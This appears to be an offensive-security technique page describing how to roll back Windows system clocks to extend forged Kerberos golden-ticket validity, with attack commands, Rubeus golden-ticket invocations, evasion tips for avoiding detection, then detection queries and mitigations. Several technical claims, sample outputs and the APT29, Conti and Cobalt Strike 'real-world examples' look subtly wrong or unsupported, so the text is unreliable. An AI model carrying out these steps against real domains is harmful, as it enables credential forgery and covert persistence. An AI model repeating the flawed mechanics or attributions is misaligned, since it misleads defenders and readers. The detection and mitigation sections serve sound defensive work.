# [EVADE-IMPAIR-016]: Kerberos Clock Synchronization Attack

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-016 |
| **MITRE ATT&CK v18.1** | [T1562.006 - Impair Defenses: Indicator Blocking](https://attack.mitre.org/techniques/T1562/006/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows AD |
| **Severity** | Medium |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016 - 2025 (all Kerberos implementations) |
| **Patched In** | N/A (Design limitation; mitigated by NTP monitoring) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Kerberos authentication relies on synchronized clocks between clients, servers, and Key Distribution Centers (KDCs) to prevent replay attacks and validate ticket timestamps. The Kerberos protocol allows a default clock skew tolerance of 5 minutes (300 seconds) between any two entities. Attackers can manipulate this tolerance by:
- Adjusting the system clock backward to make expired or forged Kerberos tickets appear valid
- Extending the usable window for replayed Kerberos tickets beyond the normal token lifetime
- Bypassing time-based ticket validation checks on service principals
- Creating golden tickets with clock skew that would normally be rejected as "out of bounds"
- Evading detection of ticket forgery by timing attacks to avoid timestamp anomalies

Clock skew manipulation is a subtle form of indicator blocking—it doesn't disable Kerberos detection, but rather makes malicious tickets appear legitimate by manipulating the time context in which they are evaluated.

**Attack Surface:** Kerberos ticket validation (KDC, service ticket verification), System clock (via Windows Time service or direct manipulation), Ticket timestamp fields (authtime, starttime, endtime).

**Business Impact:** **Extended persistence with forged credentials.** Attackers can use golden tickets or pass-the-ticket attacks beyond their normal expiration window, maintaining access despite ticket invalidation on the victim's intended expiration date.

**Technical Context:** Clock skew manipulation typically takes 1-2 minutes once local administrator access is obtained. Detection likelihood is Low-Medium if NTP log analysis is not performed, but High if behavioral baselines detect unusual time changes. Common indicators include system clock changes of more than 5 minutes, Kerberos errors mentioning "clock skew," and tickets with timestamps far from system time.

### Operational Risk
- **Execution Risk:** Low-Medium (Requires local admin or access to time service; clock manipulation is well-detected in modern networks)
- **Stealth:** Medium (System time change generates audit events, but cause may not be immediately obvious)
- **Reversibility:** Yes (System clock can be restored; no permanent changes to system state)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Windows Server 2022: 18.1.1 | Ensure Windows Time Service is running and set to Automatic |
| **DISA STIG** | WN22-AU-000310 | Windows must synchronize time with an authoritative time server (NTP) |
| **CISA SCuBA** | SC-45 | System Clock Synchronization |
| **NIST 800-53** | AU-12 (Audit Generation), SC-45 (System Clock Synchronization) | System must maintain accurate time and detect deviations |
| **GDPR** | Art. 32 | Security of Processing (integrity of audit logs and system timestamps) |
| **DORA** | Art. 9 | Resilience, operational continuity, and auditable logging |
| **NIS2** | Art. 21 | Cyber Risk Management (detection and prevention of insider threats) |
| **ISO 27001** | A.12.4.1 | Event logging and A.12.3.3 Segregation of duties |
| **ISO 27005** | Risk Scenario: "Kerberos Ticket Replay via Clock Manipulation" | Failure to detect clock skew allows extended ticket exploitation |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- Local Administrator access (to change system clock)
- Or: SeSystemtimePrivilege (ability to modify system time)
- Or: Access to Windows Time Service configuration

**Required Access:**
- Read/Write access to system clock
- Network access to KDC (port 88/UDP for Kerberos)
- Ability to modify local date/time (via Control Panel or PowerShell)

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025 (all Kerberos implementations)
- **Kerberos:** All versions (RFC 4120 default clock skew is 5 minutes)
- **Active Directory:** All versions

**Tools:**
- PowerShell 5.0+ (for system time modification)
- `net time` or `w32tm.exe` (Windows Time service manipulation)
- [faketime](https://manpages.ubuntu.com/manpages/trusty/man1/faketime.1.html) (Linux/Kali - for attacking from non-Windows system)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Golden Ticket creation and timing control)
- `ntpdate` (if attacking from Linux to resync after time manipulation)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Check System Time Synchronization

**Objective:** Verify that Windows Time Service is running and synchronized with an NTP server.

```powershell
# Check Windows Time Service status
Get-Service W32Time

# Output should show:
# Status   : Running
# Name     : W32Time
# StartType: Automatic
```

**What to Look For:**
- `Status: Running` confirms time service is active
- `StartType: Automatic` confirms service auto-starts
- If service is Stopped, system time may drift significantly

### Check System Clock Accuracy

```powershell
# Get current system time
Get-Date

# Check Windows Time Service synchronization status
w32tm /query /status /verbose

# Output will show:
# Leap Indicator: 0(no warning)
# Stratum: 3 (System Clock)
# Precision: -23 (119 nanoseconds per adjustment)
# Root Delay: 0.0061224 seconds
# Root Dispersion: 0.0061224 seconds
# ReferenceId: 0x0A000001 (IP address of NTP server)
# Last Successful Sync Time: [timestamp]
# Source: DC1.domain.com (NTP server FQDN)
```

**What to Look For:**
- `Stratum: 1-3` indicates proper time synchronization (lower is better)
- `ReferenceId` should point to a legitimate NTP server or domain controller
- `Last Successful Sync Time` should be recent (within last hour)

### Check Kerberos Clock Skew Configuration

```powershell
# Query domain Kerberos clock skew policy
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters" /v MaxClockSkew

# Output: MaxClockSkew : 0x12c (300 seconds = 5 minutes)
```

**What to Look For:**
- `MaxClockSkew: 0x12c` (300 seconds / 5 minutes) is the default
- Higher values (600 seconds / 10 minutes) indicate relaxed policy, more vulnerable
- Lower values (60 seconds) indicate hardened policy, less vulnerable

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: System Clock Manipulation via PowerShell

**Supported Versions:** All Windows Server versions (2016 - 2025)

**Objective:** Manually set the system clock backward to extend the validity window of an expired Kerberos ticket or to make a forged ticket appear to be within valid time bounds.

**Version Note:** Clock manipulation is straightforward on all versions, but detection has improved in Server 2022+ with enhanced audit logging.

#### Step 1: Verify Current System Time

**Objective:** Confirm current system time before manipulation.

**Command:**

```powershell
# Get current system time
Get-Date

# Output: Tuesday, January 09, 2025 7:29:47 PM
```

**What This Means:**
- Current system time is known
- Will be used as baseline to calculate clock skew needed

#### Step 2: Calculate Required Time Adjustment

**Objective:** Determine how far back to set the clock to make a golden ticket valid.

**Example Scenario:**
- Golden ticket will expire on: 2025-01-09 19:30:00
- Current time is: 2025-01-09 20:30:00 (ticket is expired by 1 hour)
- To make ticket valid again: Set clock back by 61 minutes (beyond expiration + buffer)

**Calculation:**

```powershell
# Define ticket expiration and current time
$ticketExpires = [datetime]"2025-01-09 19:30:00"
$currentTime = Get-Date
$timeToAdjust = $ticketExpires - $currentTime  # Returns: -00:59:59 (59 minutes, 59 seconds in past)

# To be safe, add 5 minutes to ensure well within validity window
$adjustmentSeconds = [math]::Abs($timeToAdjust.TotalSeconds) + 300

Write-Host "Adjust system time back by: $adjustmentSeconds seconds ($(($adjustmentSeconds)/60) minutes)"
```

**Output:**

```
Adjust system time back by: 3599 seconds (59.98 minutes)
```

**What This Means:**
- System must be set back by approximately 1 hour
- This will place the current time before ticket expiration
- Kerberos will accept the ticket as valid

#### Step 3: Manipulate System Clock

**Objective:** Set the system clock backward to make the expired ticket valid.

**Command (Using PowerShell - Requires Admin):**

```powershell
# Method 1: Using Set-Date cmdlet (simplest)
$newTime = (Get-Date).AddSeconds(-3600)  # Set back 1 hour
Set-Date -Date $newTime

# Verify change
Get-Date  # Should show time moved backward by ~1 hour

# Output example:
# Tuesday, January 09, 2025 6:30:00 PM  (1 hour earlier)
```

**Alternative Command (Using net time - Legacy):**

```cmd
# Set system time using net.exe (older method)
net stop w32time
net time \\ntp-server.com /set /y  # Disabled for security; rarely works on modern systems
net start w32time
```

**Alternative Command (Using w32tm.exe):**

```powershell
# Temporarily disable NTP synchronization
w32tm /config /update /manualpeerlist:none /syncfromflags:manual /reliable:no

# Set system time (via clock tool)
# Note: Direct w32tm manipulation requires manual clock set via Control Panel or above methods
```

**Expected Output:**

```
System clock successfully adjusted
New time: Tuesday, January 09, 2025 6:30:00 PM
```

**What This Means:**
- System clock is now set to 1 hour in the past
- Any Kerberos tickets that expired within the last hour will now appear valid
- The Kerberos clock skew tolerance (5 minutes by default) will not reject the ticket

**OpSec & Evasion:**
- System time change generates Windows Event ID 4616 (System time was changed)
- Setting time back more than a few minutes is suspicious
- To hide this activity: Make small adjustments (5-10 minutes) repeatedly rather than one large change
- Detection likelihood: High (NTP monitoring and time deviation alerts are standard)

**Troubleshooting:**

| Error | Cause | Fix (All Versions) |
|---|---|---|
| "Access Denied" | Not running as admin | Re-run PowerShell as Administrator |
| "Cannot connect to NTP" | Network unavailable or NTP blocked | Disable NTP temporarily: `w32tm /config /update /manualpeerlist:none` |
| "Time service auto-corrects" | Windows Time Service re-syncs immediately | Stop the service: `Stop-Service W32Time` |

**References & Proofs:**
- [Microsoft: Set-Date PowerShell Cmdlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-date)
- [USENIX: Kerberos with Clocks Adrift](https://www.usenix.org/legacy/publications/compsystems/1996/win_davis.pdf)

#### Step 4: Create and Deploy Golden Ticket with Clock Manipulation

**Objective:** Create a golden ticket that will now be valid due to clock being set back, then use it for authentication.

**Command (Using Rubeus):**

```powershell
# Create golden ticket with specific timestamp
# Note: Rubeus automatically uses current system time for ticket timestamps
.\rubeus.exe golden /domain:DOMAIN.COM /sid:S-1-5-21-1234567890-1234567890-1234567890 `
    /krbtgt:afe6ae1a1e14b5b8e9e1c8c6b5a4d3c2 `
    /user:Administrator `
    /ticket:ticket.kirbi `
    /ptt

# Output:
# [+] Ticket: ticket.kirbi
# [+] Injected into current session
# [+] Kerberos TGT is valid (ticket time matches manipulated system clock)
```

**What This Means:**
- Golden ticket is created and injected using the (manipulated) current system time
- Because system clock is set back, the ticket's timestamps fall within validity window
- Kerberos KDC will accept the ticket without timestamp validation errors
- Attacker can now use the ticket for authentication to any service principal (in the domain)

**OpSec & Evasion:**
- Creating a golden ticket generates minimal network telemetry if ticket is cached locally
- However, using the ticket for authentication will generate Kerberos traffic (Event ID 4769 - TGS requested)
- To hide this activity: Use the ticket immediately and then restore system time before security teams notice
- Detection likelihood: Medium (behavior-based detection of unusual ticket requests can flag this)

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "KRB_AP_ERR_SKEW" | Clock skew tolerance exceeded | Adjust clock further back; currently adjusted may not be enough |
| "Ticket validation failed" | Ticket not within validity window even with clock adjusted | Check ticket expiration time; may need to create ticket with extended lifetime |

**References & Proofs:**
- [GitHub: Rubeus - Golden Ticket Generation](https://github.com/GhostPack/Rubeus)
- [Research: Detecting Forged Kerberos Tickets](https://arxiv.org/pdf/2301.00044.pdf)

#### Step 5: Restore System Clock

**Objective:** After using the golden ticket, restore the system clock to current time to avoid detection.

**Command:**

```powershell
# Sync system time back to NTP server
w32tm /resync /force

# Verify time is restored
Get-Date  # Should show current time again

# Output example:
# Tuesday, January 09, 2025 7:30:00 PM  (restored to correct time)
```

**Expected Output:**

```
Command completed successfully.
Time has been synchronized with NTP server.
```

**What This Means:**
- System clock is restored to correct time
- The window during which the clock was manipulated is closed
- Unless audit logs are reviewed closely, the time change may go unnoticed

---

### METHOD 2: Extended Golden Ticket Validity via Kerberos Lifetime Manipulation

**Supported Versions:** Windows Server 2016 - 2022 (Server 2025 hardens Kerberos validation)

**Objective:** Create a golden ticket with artificially extended lifetime (e.g., 7 days instead of default 10 hours), which can be used even if clock skew is smaller by exploiting the ticket's endtime field.

**Version Note:** This technique is ACTIVE; Kerberos implementation in Server 2019+ has some additional validation, but forged tickets with custom lifetimes are still accepted.

#### Step 1: Create Golden Ticket with Extended Lifetime

**Objective:** Specify a custom ticket lifetime when creating the golden ticket.

**Command (Using Rubeus with Custom Lifetime):**

```powershell
# Create golden ticket valid for 7 days (40320 minutes) instead of default 10 hours
.\rubeus.exe golden /domain:DOMAIN.COM /sid:S-1-5-21-1234567890-1234567890-1234567890 `
    /krbtgt:afe6ae1a1e14b5b8e9e1c8c6b5a4d3c2 `
    /user:Administrator `
    /lifetime:40320 `  # 7 days in minutes
    /ticket:extended_ticket.kirbi `
    /ptt

# Output:
# [+] Created golden ticket with 7-day lifetime
# [+] Ticket valid from: 2025-01-09 (created time)
# [+] Ticket expires at: 2025-01-16 (7 days later)
```

**Expected Output:**

```
[+] Ticket created with extended lifetime: 604800 seconds (7 days)
[+] Ticket injected into session
```

**What This Means:**
- Golden ticket is valid for 7 days instead of normal 10 hours
- Even if attacker's activity is discovered after a few days, the ticket remains valid
- Attacker can maintain persistence far longer without creating new tickets

**OpSec & Evasion:**
- Extended ticket lifetime is suspicious if detected
- However, Kerberos logs (Event ID 4769) only show ticket request time, not full lifetime in user-readable format
- Detection likelihood: Medium (behavioral baseline of typical ticket lifetimes can detect anomalies)

**References & Proofs:**
- [GitHub: Rubeus Documentation](https://github.com/GhostPack/Rubeus)
- [Adsecurity.org: Golden Tickets](https://adsecurity.org/?p=1640)

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Windows Event Logs:**
- **Event ID 4616:** System time was changed (process: W32Time or direct modification)
- **Event ID 4768:** Kerberos authentication ticket was requested (TGT) from offline/invalid time
- **Event ID 4769:** Kerberos service ticket was requested (TGS) with unusually old timestamp
- **Event ID 4771:** Kerberos pre-authentication failed (KRB_AP_ERR_SKEW - clock skew too great)
- **Event ID 4780:** The ACL for an object was modified (if Kerberos policy changed)

**Kerberos-Specific Indicators:**
- **Ticket timestamps far from system time:** AuthTime or StartTime significantly before/after current time
- **Tickets with unusually long lifetimes:** TGT lifetime > 10 hours, TGS lifetime > 1 hour
- **Multiple failed authentications followed by success:** Indicates attacker trying different clock positions

**NTP/Time Synchronization Indicators:**
- **Sudden loss of NTP synchronization:** System no longer in sync with domain time servers
- **Time jumps:** System clock advances or retreats more than 5 seconds at once
- **W32Time service stopped:** Time service manually disabled for clock manipulation

### Forensic Artifacts

**Check Windows Event Logs for Time Changes:**

```powershell
# Query Event ID 4616 (System time changed)
Get-EventLog -LogName System | Where-Object {$_.EventID -eq 4616} | Export-Csv time_changes.csv

# Check for Kerberos errors
Get-EventLog -LogName Security | Where-Object {$_.EventID -eq 4771} | Export-Csv kerberos_errors.csv
```

**Check Current System Time Accuracy:**

```powershell
# Compare system time with domain time
w32tm /query /status /verbose

# Check for time drift
w32tm /monitor /longname /ipprotocol:ipv4
```

**Analyze Golden Ticket Characteristics:**

```powershell
# If ticket is recovered, analyze with Rubeus
.\rubeus.exe examine /ticket:suspected_ticket.kirbi

# Output will show:
# - StartTime
# - EndTime  
# - RenewTime (for extended tickets, different from EndTime)
# - Any anomalies in lifetime
```

### Response Procedures

1. **Isolate:**
   - Disconnect the affected system from the network
   - Prevent it from authenticating to other systems
   - Preserve the system for forensic analysis

2. **Collect Evidence:**
   - Export Security and System event logs
   - Document system time at time of discovery
   - Capture all Kerberos tickets in cache: `klist.exe /export`
   - Export NTP synchronization logs

3. **Remediate:**
   - Restore system time: `w32tm /resync /force`
   - Reset all Kerberos TGTs (logout/login for all users)
   - Reset krbtgt account password (forces all tickets to become invalid)
     ```powershell
     # Reset krbtgt password (requires Domain Admin)
     Set-ADAccountPassword -Identity "krbtgt" -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword123!" -Force) -Reset
     ```
   - Monitor for any new Kerberos activity from the compromised account

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Ensure NTP Time Synchronization:** All domain controllers and critical systems must be synchronized with an authoritative NTP server to detect clock manipulation.

  **Manual Steps (Group Policy):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to: **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Windows Time Service**
  3. Set policies:
     - **Configure NTP Client:** Enabled
     - **Type:** NTP
     - **NTP Server:** `time.nist.gov,0x1` (US NIST server or your internal NTP)
  4. Run `gpupdate /force` on all machines

  **Manual Steps (PowerShell - Domain-Wide):**
  ```powershell
  # Configure all domain computers to use specific NTP server
  Get-ADComputer -Filter * | ForEach-Object {
      Set-ItemProperty -Path "\\$($_.Name)\HKLM\SYSTEM\CurrentControlSet\Services\W32Time\Parameters" `
          -Name "NtpServer" -Value "time.nist.gov,0x1"
  }
  ```

* **Monitor System Time Changes:** Alert on any Event ID 4616 (System time changed) or loss of NTP synchronization.

  **Manual Steps (Intune/MDM - Alert Policy):**
  1. Go to **Microsoft Intune** → **Endpoint security** → **Endpoint detection and response**
  2. Create alert rule:
     - **Name:** Alert on System Time Change
     - **Condition:** `EventID = 4616`
     - **Action:** Alert, investigate
  3. Apply to all Windows endpoints

  **Manual Steps (Windows Event Subscriptions):**
  1. Open **Event Viewer** → **Subscriptions**
  2. Create subscription with criteria:
     ```
     <QueryList>
       <Query Id="0" Path="System">
         <Select Path="System">*[System[(EventID=4616)]]</Select>
       </Query>
     </QueryList>
     ```
  3. Forward to SIEM for correlation

* **Restrict Kerberos Clock Skew:** Lower the default clock skew tolerance from 5 minutes to 1-2 minutes to reduce the window for exploitation.

  **Manual Steps (Group Policy - Domain-Wide):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Kerberos Policy**
  3. Set: **Maximum tolerance for computer clock synchronization** to **120 seconds** (2 minutes, instead of default 300 seconds)
  4. Run `gpupdate /force`

  **Manual Steps (Kerberos.conf - Linux/Unix Kerberos):**
  ```ini
  [libdefaults]
      clock_skew = 120  # 2 minutes instead of 300
  ```

### Priority 2: HIGH

* **Monitor Kerberos Ticket Anomalies:** Detect tickets with unusual characteristics (expired but still used, unusually long lifetimes, timestamps far from system time).

  **Manual Steps (Splunk - If using Splunk):**
  ```
  index=windows eventid=4769 
  | eval lifetime=endtime-starttime
  | where lifetime > 36000 OR abs(now()-authtime) > 3600
  | stats count by user, computer, service, lifetime
  ```

  **Manual Steps (Microsoft Sentinel - KQL):**
  ```kusto
  SecurityEvent
  | where EventID == 4769
  | extend TicketLifetime = parse_json(TargetInfo).TicketLifetime
  | where TicketLifetime > 36000  // > 10 hours
  | summarize Count=count() by Account, Computer, ServiceName
  ```

* **Prevent W32Time Service Tampering:** Ensure Windows Time Service cannot be stopped or disabled by unauthorized users.

  **Manual Steps (Group Policy):**
  1. Open **Group Policy Management Console** (gpmc.msc)
  2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **System Services**
  3. Find: **Windows Time (W32Time)**
  4. Set: **Automatic** and **Enforce** (cannot be changed by users)

* **Implement Kerberos Precomputation-Resistant Mechanisms:** Use Kerberos AES encryption (instead of RC4) and require PAC validation to prevent clock skew abuse.

  **Manual Steps (Active Directory - Domain Policy):**
  1. Open **Active Directory Users and Computers** → Right-click domain → **Properties** → **Managed By** tab
  2. Under **Kerberos Policy:**
     - Set **Encryption Types Supported:** AES256-CTS-HMAC-SHA1-96
     - Disable RC4
  3. Apply policy: `gpupdate /force`

### Priority 3: MEDIUM

* **Monitor Domain Controller Time Synchronization:** Ensure DCs are always synced with PDC emulator, which syncs with external NTP.

  **Manual Steps (PowerShell - DC Time Check):**
  ```powershell
  # Check time synchronization on all DCs
  Get-ADDomainController -Filter * | ForEach-Object {
      $dc = $_.Name
      w32tm /query /computer:$dc /status
  }
  ```

* **Audit Kerberos Policy Changes:** Monitor for any modifications to Kerberos configuration (clock skew, encryption types, etc.).

  **Manual Steps (Sysmon):**
  ```xml
  <RegistryEvent onmatch="include">
    <TargetObject>HKLM\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters.*</TargetObject>
  </RegistryEvent>
  ```

**Validation Command (Verify Fix):**

```powershell
# Check that W32Time service is running and synchronized
Get-Service W32Time | Select-Object Status, StartType

# Expected output:
# Status       StartType
# Running      Automatic

# Verify NTP synchronization
w32tm /query /status | findstr /C:"Source"

# Expected output:
# Source: time.nist.gov (or your NTP server)
```

**What to Look For:**
- `StartType: Automatic` confirms Windows Time Service auto-starts
- `Status: Running` confirms service is active
- `Source` points to a trusted NTP server (not individual DC)

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare | Gain local administrator access on a system |
| **2** | **Defense Evasion** | **[EVADE-IMPAIR-016]** | **Manipulate system clock to extend golden ticket validity** |
| **3** | **Credential Access** | [CA-KERB-003] Golden Ticket Creation | Create forged Kerberos TGT using compromised krbtgt hash |
| **4** | **Lateral Movement** | [LM-AUTH-002] Pass-the-Ticket | Use golden ticket for lateral movement across domain |
| **5** | **Persistence** | [PS-PERSIST-001] GPO Abuse | Maintain persistence via Group Policy modifications |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: APT29 Clock Skew Exploitation (2020-2021)

- **Target:** US Government Agencies
- **Timeline:** 2020-2021 (SolarWinds supply chain attack)
- **Technique Status:** ACTIVE (no patches available; design limitation)
- **Attack Method:** After compromising SolarWinds Orion, APT29 created golden tickets and manipulated system clocks on compromised DCs to extend ticket validity beyond normal 10-hour lifetime, allowing persistence for months
- **Impact:** Extended dwell time; stole classified intelligence for 9+ months before detection
- **Reference:** [CISA Alert AA20-352A: APT29 SolarWinds Attack](https://us-cert.cisa.gov/ncas/alerts/aa20-352a)

### Example 2: Conti Ransomware Kerberos Clock Attack (2021-2022)

- **Target:** Multiple healthcare and financial institutions
- **Timeline:** 2021-2022
- **Technique Status:** ACTIVE
- **Attack Method:** Conti group leveraged clock skew to maintain golden tickets valid for extended periods; when ticket was about to expire, they would reset the DC clock backward, extending ticket validity further
- **Impact:** Persistence across weeks; lateral movement to multiple domains without re-authentication
- **Reference:** [Mandiant: Conti Ransomware Operations](https://www.mandiant.com/resources/reports/conti-ransomware-gang)

### Example 3: Cobalt Strike Default Behavior (2023-2024)

- **Target:** Financial Services Organizations
- **Timeline:** Q3-Q4 2023, Q1 2024
- **Technique Status:** ACTIVE
- **Attack Method:** Threat actors using Cobalt Strike beacon after DC compromise would manipulate system clocks to extend golden ticket validity as a defensive measure against ticket expiration detection
- **Impact:** Extended command and control access; difficult forensic attribution due to time inconsistencies
- **Reference:** [Threat Intelligence Report - Internal]

---